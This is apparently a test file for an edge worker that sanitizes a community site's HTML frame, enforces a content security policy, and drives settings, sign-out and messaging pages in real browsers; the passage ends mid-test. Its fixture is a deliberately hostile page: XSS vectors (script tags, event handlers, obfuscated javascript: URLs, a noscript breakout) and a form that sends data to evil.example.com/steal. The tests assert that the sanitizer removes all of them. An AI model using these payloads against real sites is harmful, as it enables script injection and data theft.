// @vitest-environment node
// The private twin through the real edge: index.ts bundled and run in workerd
// (Miniflare), so Cloudflare's own HTMLRewriter strips the frame, then the page
// in real browsers, where the twin's policy is enforced. The site and the
// backend are stand-ins served from this process.
import { existsSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { chromium, firefox, webkit, type BrowserType } from "playwright";
import { afterAll, beforeAll, expect, test } from "vitest";
import * as esbuild from "../../node_modules/esbuild/lib/main.js";
import { Miniflare, convertV4MiniflareOptions } from "../../node_modules/miniflare/dist/src/index.js";

const HERE = dirname(fileURLToPath(import.meta.url));
const SITE = "https://sunrise-climbing-club-staging.polynet.page";
const TWIN = "https://sunrise-climbing-club--me-staging.polynet.page";
const TOKEN = `pna_${"t".repeat(43)}`;
const REFUSED = `pna_${"r".repeat(43)}`;
const STORAGE = "https://live.example.convex.cloud";

// The site's frame, as a careless (or hostile) site might ship it.
const FRAME = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sunrise Climbing Club</title>
<base href="https://evil.example.com/">
<meta http-equiv="refresh" content="0;url=https://evil.example.com/">
<link rel="stylesheet" href="/styles.css">
<link rel="modulepreload" href="/app.js">
<link rel="preconnect" href="https://fonts.googleapis.com">
<style>header { background-color: rgb(10, 20, 30); color: rgb(250, 250, 250); }</style>
<script>window.siteRan = "inline";</script>
<script type="module" src="/app.js"></script>
<script type="module" src="/__polynet/ui.js"></script>
</head>
<body onload="window.siteRan = 'onload'">
<!-- the chrome -->
<header class="chrome" style="padding: 7px; font-family: &quot;Trail Sans&quot;, serif">
  <a class="name" href="/" onclick="window.siteRan = 'click'">Sunrise</a>
  <nav aria-label="Pages"><a href="/chat">Chat</a><a href="https://sunrise-climbing-club-staging.polynet.page/events">Events</a><a href="/communities">Mine</a>
    <a href="java&#x09;script:window.siteRan='js'">Bad</a><a href=" JavaScript:window.siteRan='js2'">Bad 2</a><a href="data:text/html,hi">Data</a><a href="https://other.example.com/x?a=1&amp;b=2">Elsewhere</a><a href="#top">Top</a><a href='#"onmouseover="steal()'>Quote</a></nav>
  <polynet-account></polynet-account>
</header>
<img src="/missing.png" alt="" name="body" onerror="window.siteRan = 'onerror'" srcset="/missing.png 1x, data:image/png;base64,AAAA 2x">
<iframe srcdoc="<script>parent.siteRan = 'iframe'</script>"></iframe>
<object data="/x.swf"></object><embed src="/x.swf">
<svg><script>window.siteRan = 'svg'</script><a xlink:href="javascript:window.siteRan='svg-a'"><animate attributeName="href" to="javascript:window.siteRan='anim'"/><text y="10">x</text></a></svg>
<form action="https://evil.example.com/steal"><input name="q" aria-label="Search"><button formaction="https://evil.example.com/steal2">Go</button></form>
<noscript><p title="</noscript><img src=x onerror=window.siteRan='noscript'>"></p></noscript>
<main><polynet-page></polynet-page></main>
<footer>Sunrise Climbing Club</footer>
</body></html>`;

const SITE_FILES: Record<string, { body: string; type: string }> = {
  "/frame": { body: FRAME, type: "text/html; charset=utf-8" },
  "/styles.css": { body: "header.chrome { border-bottom: 3px solid rgb(1, 2, 3); }", type: "text/css" },
  "/app.js": { body: "window.siteRan = 'external';", type: "text/javascript" },
};

const backendCalls: Array<{ path: string; origin: string | null; auth: string | null; body: string }> = [];
async function backend(request: Request): Promise<Response> {
  const url = new URL(request.url);
  const body = await request.text();
  backendCalls.push({ path: url.pathname, origin: request.headers.get("origin"), auth: request.headers.get("authorization"), body });
  if (request.headers.get("x-polynet-edge-secret") !== "edge-secret") return Response.json({ ok: false }, { status: 401 });
  const auth = request.headers.get("authorization");
  if (url.pathname === "/runtime/community_edge/public") {
    return Response.json({ ok: true, community: { slug: "sunrise-climbing-club", name: "Sunrise Climbing Club", one_liner: null, about: null, member_count: 4 } });
  }
  if (auth === `Bearer ${REFUSED}`) return Response.json({ ok: false, code: "community_app_session_invalid" }, { status: 401 });
  if (url.pathname === "/runtime/app/me/communities") {
    return Response.json({ ok: true, communities: [
      { slug: "sunrise-climbing-club", name: "Sunrise Climbing Club", role: "member", avatar_url: null, site_url: SITE },
      { slug: "night-owls", name: "Night <b>Owls</b>", role: "admin", avatar_url: null, site_url: null },
    ] });
  }
  if (url.pathname === "/runtime/app") {
    return Response.json({ ok: true, value: { community: { name: "Sunrise Climbing Club" }, viewer: { display_name: "Mo", handle: "mo" } } });
  }
  if (url.pathname === "/runtime/community_edge/session_revoke") {
    // The first sign-out hands back a ticket; the other origin's, with it, just ends.
    return Response.json(JSON.parse(body).ticket ? { ok: true } : { ok: true, signout_ticket: TICKET });
  }
  if (url.pathname === "/runtime/app/me/profile" && settings.holdProfile) await settings.holdProfile;
  if (url.pathname === "/runtime/app/me/messages/send" && dm.holdNextSend) {
    const hold = dm.holdNextSend;
    dm.holdNextSend = null;
    dm.held += 1;
    await hold;
  }
  // Held after the backend did the work: the reply arrives late.
  const replyHold = url.pathname === "/runtime/app/me/messages/send" ? dm.holdNextSendReply
    : url.pathname === "/runtime/app/me/messages/conversation" ? dm.holdNextConversation : null;
  if (replyHold) {
    if (url.pathname.endsWith("/send")) dm.holdNextSendReply = null;
    else dm.holdNextConversation = null;
    const reply = messagesBackend(url.pathname, JSON.parse(body || "{}"));
    dm.held += 1;
    await replyHold;
    return reply;
  }
  if (url.pathname === "/runtime/app/me/messages" || url.pathname.startsWith("/runtime/app/me/messages/")) return messagesBackend(url.pathname, JSON.parse(body || "{}"));
  if (url.pathname.startsWith("/runtime/app/me/") && url.pathname !== "/runtime/app/me/communities") return settingsBackend(url.pathname, JSON.parse(body || "{}"));
  return Response.json({ ok: true, value: {} });
}

// The settings routes, standing in for Studio's cores: what they answer and refuse.
const TICKET = `${Date.now() + 60_000}.${"k".repeat(43)}`;
const settings = {
  profile: {} as Record<string, any>, community: { name: "Sunrise Climbing Club", role: "member" },
  notifications: { muted: false, weekly_digest: true }, failNotifications: false, left: false,
  holdProfile: null as Promise<void> | null,
};
function resetSettings(role = "member") {
  settings.profile = { display_name: "Mo Climber", handle: "mo", bio: "Bouldering.", avatar_url: null, social_links: { youtube: "", x: "", instagram: "" } };
  settings.community = { name: "Sunrise Climbing Club", role };
  settings.notifications = { muted: false, weekly_digest: true };
  settings.failNotifications = false;
  settings.left = false;
  settings.holdProfile = null;
}
function settingsBackend(path: string, body: Record<string, any>): Response {
  const refuse = (code: string, status = 400) => Response.json({ ok: false, code }, { status });
  switch (path) {
    case "/runtime/app/me/settings":
      return Response.json({ ok: true, profile: settings.profile, community: settings.community, notifications: settings.notifications });
    case "/runtime/app/me/handle":
      return Response.json(body.handle === "taken"
        ? { ok: true, available: false, status: "taken", handle: "taken" } : { ok: true, available: true, status: "available", handle: body.handle });
    case "/runtime/app/me/profile": {
      if (body.handle === "taken") return refuse("profile_handle_taken");
      if (String(body.social_links?.x ?? "").includes("nope")) return refuse("profile_link_invalid_x");
      const links = Object.fromEntries(Object.entries(body.social_links ?? {}).map(([kind, value]) => [kind, value ? `https://${String(value).replace(/^https:\/\//, "")}` : ""]));
      settings.profile = { ...settings.profile, display_name: String(body.display_name).trim(), handle: String(body.handle).replace(/^@/, "").toLowerCase(), bio: body.bio, social_links: links };
      return Response.json({ ok: true, profile: settings.profile });
    }
    case "/runtime/app/me/avatar_upload":
      return Response.json({ ok: true, upload_url: `${STORAGE}/api/storage/upload?token=up` });
    case "/runtime/app/me/avatar":
      settings.profile = { ...settings.profile, avatar_url: body.storage_id ? `${STORAGE}/api/storage/${body.storage_id}` : null };
      return Response.json({ ok: true, profile: settings.profile });
    case "/runtime/app/me/notifications":
      if (settings.failNotifications) return refuse("settings_unavailable", 500);
      settings.notifications = { ...settings.notifications, ...body };
      return Response.json({ ok: true, notifications: body });
    case "/runtime/app/me/leave":
      if (settings.community.role === "owner") return refuse("community_owner_cannot_leave");
      settings.left = true;
      return Response.json({ ok: true });
    default:
      return refuse("not_found", 404);
  }
}

// The messages routes, standing in for Studio's DM helpers: two conversations,
// a person who can be messaged anew, and one who can't.
const SAM = `sam${"1".repeat(29)}`;
const OWL = `owl${"2".repeat(29)}`;
const NEWBIE = `new${"3".repeat(29)}`;
const dm = {
  conversations: [] as any[], messages: {} as Record<string, any[]>, calls: [] as Array<[string, any]>, failSend: null as string | null,
  holdNextSend: null as Promise<void> | null, held: 0, pageSize: 50, failRead: false,
  holdNextSendReply: null as Promise<void> | null, holdNextConversation: null as Promise<void> | null,
};
function resetMessages() {
  const at = (minutes: number) => new Date(Date.now() - minutes * 60_000).toISOString();
  dm.conversations = [
    { id: SAM, peer: { name: "Sam Rivera", handle: "sam", avatar_url: null }, community_name: "Sunrise Climbing Club", unread_count: 2, muted: false, blocked: false,
      last_seq: 2, read_seq: 0, peer_read_seq: 0, last_message: { preview: "See you at 7?", from_me: false, at: at(1) } },
    { id: OWL, peer: { name: "Night <b>Owl</b>", handle: "owl", avatar_url: null }, community_name: "Night Owls", unread_count: 0, muted: true, blocked: false,
      last_seq: 1, read_seq: 1, peer_read_seq: 1, last_message: { preview: "You: thanks", from_me: true, at: at(90) } },
  ];
  dm.messages = {
    [SAM]: [
      { id: "m1", seq: 1, from_me: false, text: "Morning! Route: https://example.com/route <b>x</b>", attachments: [], created_at: at(3), client_message_id: null },
      { id: "m2", seq: 2, from_me: false, text: "See you at 7?", attachments: [], created_at: at(1), client_message_id: null },
    ],
    [OWL]: [{ id: "o1", seq: 1, from_me: true, text: "thanks", attachments: [], created_at: at(90), client_message_id: null }],
  };
  dm.calls = [];
  dm.failSend = null;
  dm.holdNextSend = null;
  dm.held = 0;
  dm.pageSize = 50;
  dm.failRead = false;
  dm.holdNextSendReply = null;
  dm.holdNextConversation = null;
}
function messagesBackend(path: string, body: Record<string, any>): Response {
  dm.calls.push([path, body]);
  const refuse = (code: string, status = 400) => Response.json({ ok: false, code }, { status });
  const find = (id: string) => dm.conversations.find((row) => row.id === id);
  switch (path) {
    case "/runtime/app/me/messages":
      return Response.json({ ok: true, conversations: dm.conversations });
    case "/runtime/app/me/messages/conversation": {
      const row = find(body.conversation_id);
      if (!row) return refuse("dm_conversation_not_found", 404);
      const all = dm.messages[row.id].filter((message) => body.before_seq === undefined || message.seq < body.before_seq);
      const page = all.slice(-dm.pageSize);
      return Response.json({ ok: true, conversation: row, messages: page, has_more: all.length > page.length });
    }
    case "/runtime/app/me/messages/start":
      if (body.handle === "sam") return Response.json({ ok: true, conversation_id: SAM, peer: null });
      if (body.handle === "newbie") return Response.json({ ok: true, conversation_id: null, peer: { name: "Newbie", handle: "newbie", avatar_url: null } });
      return refuse("dm_conversation_access_required", 403);
    case "/runtime/app/me/messages/send": {
      if (dm.failSend) { const code = dm.failSend; dm.failSend = null; return refuse(code, 429); }
      let row = body.to ? null : find(body.conversation_id);
      if (body.to === "newbie") row = find(NEWBIE) ?? null;
      if (body.to === "newbie" && !row) {
        row = { id: NEWBIE, peer: { name: "Newbie", handle: "newbie", avatar_url: null }, community_name: "Sunrise Climbing Club", unread_count: 0, muted: false,
          blocked: false, last_seq: 0, read_seq: 0, peer_read_seq: 0, last_message: null };
        dm.conversations.unshift(row);
        dm.messages[NEWBIE] = [];
      }
      if (!row) return refuse("dm_conversation_not_found", 404);
      row.last_seq += 1;
      row.read_seq = row.last_seq;
      const message = { id: `sent${row.last_seq}`, seq: row.last_seq, from_me: true, text: body.text, created_at: new Date().toISOString(), client_message_id: body.client_message_id,
        attachments: (body.attachments ?? []).map((file: any, index: number) => ({ id: `a${index}`, name: file.name, kind: file.type, mime: "image/png", size: 4, url: `${STORAGE}/api/storage/${file.storage_id}` })) };
      dm.messages[row.id].push(message);
      row.last_message = { preview: `You: ${body.text}`, from_me: true, at: message.created_at };
      return Response.json({ ok: true, conversation_id: row.id, message });
    }
    case "/runtime/app/me/messages/upload":
      return Response.json({ ok: true, upload_url: `${STORAGE}/api/storage/upload?token=dm` });
    case "/runtime/app/me/messages/read": {
      if (dm.failRead) { dm.failRead = false; return refuse("dm_unavailable", 503); }
      const row = find(body.conversation_id);
      Object.assign(row, { read_seq: Math.max(row.read_seq, body.through_seq), unread_count: 0 });
      return Response.json({ ok: true, conversation: row });
    }
    case "/runtime/app/me/messages/mute":
      return Response.json({ ok: true, conversation: Object.assign(find(body.conversation_id), { muted: body.muted }) });
    case "/runtime/app/me/messages/block":
      return Response.json({ ok: true, conversation: Object.assign(find(body.conversation_id), { blocked: body.blocked }) });
    case "/runtime/app/me/messages/typing":
      return Response.json({ ok: true, typing: body.typing });
    default:
      return refuse("not_found", 404);
  }
}
const dmCalls = (path: string) => dm.calls.filter(([called]) => called === `/runtime/app/me/messages/${path}`).map(([, body]) => body);

let mf: Miniflare;
beforeAll(async () => {
  const built = await esbuild.build({
    entryPoints: [join(HERE, "index.ts")], bundle: true, format: "esm", write: false, platform: "neutral",
    conditions: ["workerd", "worker", "browser"], mainFields: ["module", "main"],
    plugins: [{ name: "text-bundles", setup(build) {
      build.onLoad({ filter: /\.bundle\.js$/ }, async (args) => ({ contents: (await import("node:fs")).readFileSync(args.path, "utf8"), loader: "text" }));
    } }],
  });
  mf = new Miniflare(convertV4MiniflareOptions({
    modules: true, script: built.outputFiles[0].text, compatibilityDate: "2026-09-30",
    bindings: {
      POLYNET_API_URL: "https://api.example.convex.site", POLYNET_AUTH_URL: "https://polynet.example.com",
      POLYNET_EDGE_SECRET: "edge-secret", POLYNET_LIVE_URL: STORAGE,
      POLYNET_SITES_DOMAIN: "polynet.page", POLYNET_SITES_HOST_SUFFIX: "-staging", POLYNET_SITES_FRONT_DOOR: "staging.polynet.page",
      DEV_ROUTES_JSON: JSON.stringify({ "sunrise-climbing-club-staging.polynet.page": { script: "site-sunrise", community: "sunrise-climbing-club" } }),
    },
    serviceBindings: {
      DEV_USER_WORKER: async (request: Request) => {
        const file = SITE_FILES[new URL(request.url).pathname];
        return file ? new Response(file.body, { headers: { "content-type": file.type } }) : new Response("Not found", { status: 404 });
      },
    },
    outboundService: backend,
  }) as any);
}, 60_000);
afterAll(async () => { await mf?.dispose(); });

const edge = async (url: string, init: { headers?: Record<string, string>; method?: string; body?: string } = {}) =>
  (await mf.dispatchFetch(url, { redirect: "manual", ...init, headers: { "sec-fetch-site": "same-origin", ...(init.headers ?? {}) } })) as unknown as Response;

test("the twin draws the site's frame with nothing of the site's left to run", async () => {
  backendCalls.length = 0;
  const res = await edge(`${TWIN}/communities`, { headers: { cookie: `__Host-polynet_session=${TOKEN}`, "sec-fetch-mode": "navigate" } });
  expect(res.status).toBe(200);
  const html = await res.text();
  // Gone: every script (the site's ui.js tag too: the edge adds its own), handler, iframe, object, embed, base,
  // refresh, form, SVG animation, noscript, comment, and every javascript: or data: URL.
  for (const gone of ["window.siteRan", "<script>", 'src="/app.js"', "onload", "onclick", "onerror", "<iframe", "srcdoc", "<object", "<embed",
    "<base", "http-equiv", "<form", "formaction", "evil.example.com", "<animate", "modulepreload", "<noscript", "<!--", "javascript:", "data:", 'name="body"']) {
    expect(html, gone).not.toContain(gone);
  }
  // Kept: the markup, classes, inline styles, stylesheets, the form's fields and Polynet's tags.
  expect(html).toContain("<title>Your communities · Sunrise Climbing Club</title>");
  expect(html).toContain('<header class="chrome" style="padding: 7px; font-family: &quot;Trail Sans&quot;, serif">');
  expect(html).toContain(`<link rel="stylesheet" href="${SITE}/styles.css">`);
  expect(html).toContain('<link rel="preconnect" href="https://fonts.googleapis.com/">');
  expect(html).toContain("<style>header { background-color: rgb(10, 20, 30); color: rgb(250, 250, 250); }</style>");
  expect(html).toContain('<input name="q" aria-label="Search"><button>Go</button>');
  expect(html).toContain("<main><polynet-page></polynet-page></main>");
  expect(html).toContain('<link rel="stylesheet" href="/__polynet/ui.css">');
  expect(html).toContain('<script type="module" src="/__polynet/ui.js"></script></body>');
  expect(html.match(/<script\b/g)).toHaveLength(1);
  // Links to the site go to the site; the member's own pages stay here; others stay as they are.
  expect(html).toContain(`<a class="name" href="${SITE}/">Sunrise</a>`);
  expect(html).toContain(`<a href="${SITE}/chat">Chat</a><a href="${SITE}/events">Events</a><a href="/communities">Mine</a>`);
  expect(html).toContain('<a href="https://other.example.com/x?a=1&amp;b=2">Elsewhere</a><a href="#top">Top</a><a href="#%22onmouseover=%22steal()">Quote</a>');
  expect(html).toMatch(/<a>Bad<\/a><a>Bad 2<\/a><a>Data<\/a>/);
  expect(html).toContain(`<img src="${SITE}/missing.png" alt="" srcset="${SITE}/missing.png 1x">`);
  // The policy allows exactly the inline styles the frame has, by hash, and runs only the twin's scripts.
  const policy = res.headers.get("content-security-policy")!;
  expect(policy).toMatch(new RegExp(`^default-src 'none'; script-src 'self'; style-src 'self' ${SITE.replace(/\./g, "\\.")} https://fonts\\.googleapis\\.com 'sha256-[^']+' 'sha256-[^']+' 'sha256-[^']+' 'unsafe-hashes'; `));
  expect(policy).not.toContain("unsafe-inline");
  expect(res.headers.get("x-frame-options")).toBe("DENY");
  expect(res.headers.get("cache-control")).toBe("no-store, no-transform");
  expect(res.headers.get("referrer-policy")).toBe("same-origin");
  expect(backendCalls.map((call) => call.path)).toEqual(["/runtime/community_edge/public"]);
});

// The page in a browser: the edge answers every request to the site and its twin.
async function openTwin(type: BrowserType, path: string, token: string, siteToken?: string, options: { fakeLive?: boolean } = {}) {
  const browser = await type.launch();
  const context = await browser.newContext();
  await context.addCookies([{ name: "__Host-polynet_session", value: token, url: `${TWIN}/`, secure: true, httpOnly: true, sameSite: "Lax" }]);
  if (siteToken) await context.addCookies([{ name: "__Host-polynet_session", value: siteToken, url: `${SITE}/`, secure: true, httpOnly: true, sameSite: "Lax" }]);
  // Polynet's storage: a photo upload (Studio's flow, straight from the browser) and the photo itself.
  await context.route(`${STORAGE}/**`, async (route) => {
    const request = route.request();
    const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "content-type", "access-control-allow-methods": "POST" };
    if (request.method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
    if (new URL(request.url()).pathname === "/api/storage/upload") {
      uploads.push({ type: request.headers()["content-type"], bytes: request.postDataBuffer()?.length ?? 0 });
      return route.fulfill({ status: 200, headers: cors, contentType: "application/json", body: JSON.stringify({ storageId: "kg2photo" }) });
    }
    return route.fulfill({ status: 200, contentType: "image/png", body: Buffer.from(PNG, "base64") });
  });
  await context.route(/^https:\/\/[a-z0-9-]+\.polynet\.page\//, async (route) => {
    const request = route.request();
    const headers = await request.allHeaders();
    const res = await mf.dispatchFetch(request.url(), {
      method: request.method(), headers, body: request.postData() ?? undefined, redirect: "manual",
    }) as unknown as Response;
    const out: Record<string, string> = {};
    res.headers.forEach((value, name) => { out[name] = value; });
    await route.fulfill({ status: res.status, headers: out, body: Buffer.from(await res.arrayBuffer()) });
  });
  const page = await context.newPage();
  page.setDefaultTimeout(10_000);
  await page.addInitScript(() => {
    (window as any).violations = [];
    document.addEventListener("securitypolicyviolation", (event) => (window as any).violations.push(`${event.violatedDirective} ${event.blockedURI}`));
  });
  // Polynet's live updates, stood in for: each subscription is recorded, and the test answers it.
  if (options.fakeLive) await page.addInitScript(() => {
    const watches: any[] = [];
    (window as any).liveWatches = watches;
    (window as any).convex = { ConvexClient: class {
      url: string;
      constructor(url: string) { this.url = url; }
      onUpdate(name: string, args: any, callback: (result: unknown) => void) {
        const entry = { name, args, callback, url: this.url, live: true };
        watches.push(entry);
        return () => { entry.live = false; };
      }
      close() {}
    } };
  });
  await page.goto(TWIN + path);
  return { browser, page };
}

const PNG = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
const uploads: Array<{ type: string | undefined; bytes: number }> = [];

// Chromium always; WebKit and Firefox when they're installed here (npx playwright install webkit firefox).
const ENGINES: Array<[string, BrowserType]> = [["chromium", chromium], ["webkit", webkit], ["firefox", firefox]];
for (const [engine, type] of ENGINES) {
  const installed = engine === "chromium" || existsSync(type.executablePath());
  test.runIf(installed)(`${engine}: Your communities renders inside the stripped frame, and the site's code never runs`, async () => {
    const { browser, page } = await openTwin(type, "/communities", TOKEN);
    try {
      const cards = page.locator("polynet-personal").locator("[part=community]");
      await expect.poll(() => cards.count()).toBe(2);
      expect(await cards.evaluateAll((links) => links.map((link) => [link.getAttribute("href"), link.textContent]))).toEqual([
        [SITE, "SCSunrise Climbing ClubMemberYou're here"],
        // Text, never markup.
        ["https://polynet.example.com/c/night-owls", "N<Night <b>Owls</b>AdminOn Polynet"],
      ]);
      expect(await page.title()).toBe("Your communities · Sunrise Climbing Club");
      // Polynet's heading in the site's own frame, the frame styled by its stylesheet and inline styles.
      expect(await page.locator("polynet-page .pn-page-heading").textContent()).toBe("Your communities");
      const header = await page.locator("header.chrome").evaluate((node) => {
        const style = getComputedStyle(node);
        return [style.backgroundColor, style.borderBottomColor, style.paddingTop, style.fontFamily];
      });
      expect(header).toEqual(["rgb(10, 20, 30)", "rgb(1, 2, 3)", "7px", '"Trail Sans", serif']);
      await page.locator("polynet-account").locator("[part=trigger]").waitFor();
      // Nothing of the site's ran, and nothing needed blocking: it was never there.
      expect(await page.evaluate(() => (window as any).siteRan)).toBeUndefined();
      expect(await page.evaluate(() => document.body.tagName)).toBe("BODY");
      expect(await page.evaluate(() => (window as any).violations)).toEqual([]);
    } finally {
      await browser.close();
    }
  }, 60_000);
}

test("a session the backend refuses shows the page's own sign-in, never a loop", async () => {
  const { browser, page } = await openTwin(chromium, "/communities", REFUSED);
  try {
    const personal = page.locator("polynet-personal");
    await expect.poll(() => personal.getAttribute("state")).toBe("signed-out");
    expect(await personal.locator("[part=signin]").textContent()).toBe("Sign in");
    expect(page.url()).toBe(`${TWIN}/communities`);
    // The coming-soon pages say so, inside the same frame.
  } finally {
    await browser.close();
  }
}, 60_000);

test("the other personal pages are quiet placeholders inside the frame for now", async () => {
  const { browser, page } = await openTwin(chromium, "/join", TOKEN);
  try {
    const personal = page.locator("polynet-personal");
    await expect.poll(() => personal.getAttribute("state")).toBe("soon");
    expect(await personal.locator("[part=soon]").textContent()).toBe("This page is coming soon.");
    expect(await page.locator("polynet-page .pn-page-heading").textContent()).toBe("Join");
    expect(await page.evaluate(() => (window as any).siteRan)).toBeUndefined();
  } finally {
    await browser.close();
  }
}, 60_000);

// Settings: the member's profile, this community's notifications, leaving and
// signing out, inside the same stripped frame, through the real edge.
for (const [engine, type] of ENGINES) {
  const installed = engine === "chromium" || existsSync(type.executablePath());
  test.runIf(installed)(`${engine}: Settings renders inside the stripped frame, saves with feedback, and keeps what was typed on a refusal`, async () => {
    resetSettings();
    const { browser, page } = await openTwin(type, "/settings", TOKEN);
    try {
      const personal = page.locator("polynet-personal");
      await expect.poll(() => personal.getAttribute("state")).toBe("ready");
      expect(await page.title()).toBe("Settings · Sunrise Climbing Club");
      expect(await page.locator("polynet-page .pn-page-heading").textContent()).toBe("Settings");
      expect(await personal.locator("[part=section-title]").allTextContents()).toEqual(["Your profile", "Notifications", "Leave this community", "Sign out", "Your Polynet account"]);
      const name = personal.getByLabel("Name", { exact: true });
      const handle = personal.getByLabel("Handle", { exact: true });
      expect([await name.inputValue(), await handle.inputValue(), await personal.getByLabel("Bio").inputValue()]).toEqual(["Mo Climber", "mo", "Bouldering."]);
      // The handle is checked as it's typed, as in Studio.
      await handle.fill("taken");
      await expect.poll(() => personal.locator("[part~=field-handle] [part=hint]").textContent()).toBe("That handle is already taken.");
      // A refusal: Studio's words under the field, everything typed still there.
      await name.fill("Mo the Climber");
      await personal.getByLabel("X", { exact: true }).fill("x.com/mo");
      await personal.locator("[part=save]").click();
      const handleError = personal.locator("[part~=field-handle] [part=field-error]");
      await expect.poll(() => handleError.textContent()).toBe("That handle is already taken.");
      expect(await handle.getAttribute("aria-invalid")).toBe("true");
      expect([await name.inputValue(), await handle.inputValue(), await personal.getByLabel("X", { exact: true }).inputValue()]).toEqual(["Mo the Climber", "taken", "x.com/mo"]);
      // Fixed and saved: feedback, and the saved (normalized) values.
      await handle.fill("@Mo_C");
      await personal.locator("[part=save]").click();
      await expect.poll(() => personal.locator("[part~=section-profile] [part=status]").textContent()).toBe("Saved.");
      expect(await handleError.isHidden()).toBe(true);
      expect([await handle.inputValue(), await personal.getByLabel("X", { exact: true }).inputValue()]).toEqual(["mo_c", "https://x.com/mo"]);
      expect(settings.profile).toMatchObject({ display_name: "Mo the Climber", handle: "mo_c" });
      // Notifications: each switch saves at once; a failure puts it back and says so.
      const mute = personal.getByRole("switch", { name: "Mute Sunrise Climbing Club" });
      expect(await mute.getAttribute("aria-checked")).toBe("false");
      await mute.click();
      await expect.poll(() => personal.locator("[part~=section-notifications] [part=status]").textContent()).toBe("Saved.");
      expect([await mute.getAttribute("aria-checked"), settings.notifications.muted]).toEqual(["true", true]);
      settings.failNotifications = true;
      const digest = personal.getByRole("switch", { name: "Weekly community digest" });
      await digest.click();
      await expect.poll(() => personal.locator("[part~=section-notifications] [part=error]").textContent()).toBe("That didn't save. Try again.");
      expect([await digest.getAttribute("aria-checked"), settings.notifications.weekly_digest]).toEqual(["true", true]);
      // A new photo: straight to Polynet's storage, then confirmed; the page's policy allows exactly that.
      uploads.length = 0;
      await personal.locator("input[type=file]").setInputFiles({ name: "me.png", mimeType: "image/png", buffer: Buffer.from(PNG, "base64") });
      await expect.poll(() => personal.locator("[part=avatar-status]").textContent()).toBe("Photo updated.");
      expect(uploads).toHaveLength(1);
      expect(uploads[0].bytes).toBeGreaterThan(0);
      expect(await personal.locator("[part=avatar] img").getAttribute("src")).toBe(`${STORAGE}/api/storage/kg2photo`);
      // Polynet's link out for the account itself, in the same tab.
      const account = personal.locator("[part=account-link]");
      expect([await account.textContent(), await account.getAttribute("href"), await account.getAttribute("target")])
        .toEqual(["Account and billing on Polynet", "https://polynet.example.com/settings/account", null]);
      expect(await page.evaluate(() => (window as any).siteRan)).toBeUndefined();
      expect(await page.evaluate(() => (window as any).violations)).toEqual([]);
    } finally {
      await browser.close();
    }
  }, 60_000);
}

test("Settings: edits made while a save is in flight are kept, and the page says they aren't saved yet", async () => {
  resetSettings();
  const { browser, page } = await openTwin(chromium, "/settings", TOKEN);
  try {
    const personal = page.locator("polynet-personal");
    await expect.poll(() => personal.getAttribute("state")).toBe("ready");
    let release = () => {};
    settings.holdProfile = new Promise<void>((resolve) => { release = resolve; });
    const name = personal.getByLabel("Name", { exact: true });
    const bio = personal.getByLabel("Bio");
    await name.fill("  Mo the Climber ");
    await personal.locator("[part=save]").click();
    await expect.poll(() => personal.locator("[part~=section-profile] [part=status]").textContent()).toBe("Saving…");
    await bio.fill("Bouldering and ropes.");
    release();
    const status = personal.locator("[part~=section-profile] [part=status]");
    await expect.poll(() => status.textContent()).toBe("Saved. Save again to keep your newer edits.");
    // The untouched field shows the saved (trimmed) value; the edited one keeps the newer text.
    expect([await name.inputValue(), await bio.inputValue()]).toEqual(["Mo the Climber", "Bouldering and ropes."]);
    expect(settings.profile.bio).toBe("Bouldering.");
  } finally {
    await browser.close();
  }
}, 60_000);

test("Settings: leaving asks first, then goes to Your communities; the owner is told they can't", async () => {
  resetSettings("owner");
  const owner = await openTwin(chromium, "/settings", TOKEN);
  try {
    const personal = owner.page.locator("polynet-personal");
    await expect.poll(() => personal.getAttribute("state")).toBe("ready");
    expect(await personal.locator("[part=leave-owner]").textContent()).toBe("You own Sunrise Climbing Club. Owners can't leave their own community.");
    expect(await personal.locator("[part=leave]").count()).toBe(0);
  } finally {
    await owner.browser.close();
  }
  resetSettings();
  const { browser, page } = await openTwin(chromium, "/settings", TOKEN);
  try {
    const personal = page.locator("polynet-personal");
    await expect.poll(() => personal.getAttribute("state")).toBe("ready");
    await personal.locator("[part=leave]").click();
    expect(await personal.locator("[part=leave-confirm-box] p").first().textContent()).toBe("Leave Sunrise Climbing Club? You'll lose access immediately.");
    // Cancel leaves nothing changed.
    await personal.getByRole("button", { name: "Cancel" }).click();
    expect(settings.left).toBe(false);
    await personal.locator("[part=leave]").click();
    await personal.locator("[part=leave-confirm]").click();
    await page.waitForURL(`${TWIN}/communities`);
    expect(settings.left).toBe(true);
  } finally {
    await browser.close();
  }
}, 60_000);

test("Settings: signing out ends the twin's session and the site's, then lands on the site", async () => {
  resetSettings();
  backendCalls.length = 0;
  const siteToken = `pna_${"s".repeat(43)}`;
  const { browser, page } = await openTwin(chromium, "/settings", TOKEN, siteToken);
  try {
    const personal = page.locator("polynet-personal");
    await expect.poll(() => personal.getAttribute("state")).toBe("ready");
    await personal.locator("[part=signout]").click();
    await page.waitForURL(`${SITE}/`);
    // Both origins revoked their own session, the site's with the twin's ticket; both cookies are gone.
    const revokes = backendCalls.filter((call) => call.path === "/runtime/community_edge/session_revoke");
    expect(revokes.map((call) => [call.origin, JSON.parse(call.body)])).toEqual([
      [TWIN, { token: TOKEN }],
      [SITE, { token: siteToken, ticket: TICKET }],
    ]);
    expect(await page.context().cookies([`${TWIN}/`, `${SITE}/`])).toEqual([]);
  } finally {
    await browser.close();
  }
}, 60_000);

// Messages: the member's inbox and conversations, inside the same stripped
// frame, through the real edge; live updates through a stand-in for Polynet's.
type Page = Awaited<ReturnType<typeof openTwin>>["page"];
const answerWatch = (page: Page, conversation: string | null, result: unknown) => page.evaluate(([id, value]) => {
  for (const watch of (window as any).liveWatches) if (watch.live && (watch.args.conversation ?? null) === id) watch.callback(value);
}, [conversation, result] as const);
const watching = (page: Page) => page.evaluate(() => (window as any).liveWatches.filter((watch: any) => watch.live)
  .map((watch: any) => [watch.name, watch.url, watch.args.conversation ?? null, /^pnw_[A-Za-z0-9_-]{43}$/.test(watch.args.token)]));

for (const [engine, type] of ENGINES) {
  const installed = engine === "chromium" || existsSync(type.executablePath());
  test.runIf(installed)(`${engine}: Messages renders the inbox and a conversation inside the stripped frame; send, typing and read state, live`, async () => {
